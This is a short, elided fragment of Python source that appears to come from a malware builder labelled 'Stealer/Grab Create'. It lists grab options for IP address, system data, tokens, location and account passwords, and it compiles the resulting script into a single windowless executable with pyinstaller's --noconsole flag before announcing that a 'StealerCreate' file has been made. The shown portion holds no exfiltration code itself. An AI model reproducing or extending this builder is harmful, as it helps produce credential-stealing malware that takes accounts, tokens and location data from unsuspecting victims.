...
TitrePage("Stealer/Grab Create")

LAPprint(f"""{couleur.RED}
{couleur.YELLOW}Ip{couleur.RED} Grab
{couleur.YELLOW}System{couleur.RED} Grab
{couleur.YELLOW}Token{couleur.RED} Grab
{couleur.YELLOW}Location{couleur.RED} Grab
{couleur.YELLOW}Account/Password{couleur.RED} Grab""")
...
def convert_to_exe(script_name, destination_path):
    try:
        ...
        subprocess.run(['pyinstaller', '--onefile', '--distpath', destination_path, '--noconsole', script_path])
...
print(f"\n{couleur.RED}[!] | The file {couleur.CYAN}\"StealerCreate\"{couleur.LIGHTRED_EX} has been created.", couleur.RESET)
time.sleep(5)
